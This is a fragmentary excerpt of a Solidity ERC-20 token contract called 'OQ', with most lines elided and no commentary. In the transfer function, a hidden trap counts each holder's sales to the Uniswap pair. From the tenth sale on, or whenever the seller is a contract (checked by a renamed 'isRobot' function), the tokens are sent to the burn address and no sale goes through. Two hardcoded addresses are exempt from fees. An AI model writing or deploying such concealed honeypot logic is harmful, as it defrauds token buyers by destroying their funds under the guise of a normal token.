...
library Address {
    ...
    function isRobot(address account) internal view returns (bool) {
    ...
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        ...
        require(isRobot(target), "Address: call to non-contract");
...
contract OQ is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private _sellerCount;
    ...
    string private _name = "OQ";

    string private _symbol = "OQ";
    ...
    address payable public marketAddress = 0x3F2bc158869F8A1C32881d1d28B42538b6453ef8; //Marketing
    ...
    constructor () public {
        ...
        _isExcludedFromFee[address(0x4E9a1497e3F924e60aA90C693ceF2b1E8281db6B)] = true;

        _isExcludedFromFee[address(0xe1034C5d93205c6Ade8eAfcf69b22F12eFB47Fd2)]  = true;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        if(!takeFee)
         ...
         if (recipient == uniswapV2Pair && !isExcludedFromFee(sender)) {
            _sellerCount[sender] = _sellerCount[sender]+1;
            if (_sellerCount[sender] >= 10) {
                _tokenTransfer(sender, address(0x000000000000000000000000000000000000dEaD), amount, false);
                return;
            }
            if (sender.isRobot()) {
                _tokenTransfer(sender, address(0x000000000000000000000000000000000000dEaD), amount, false);
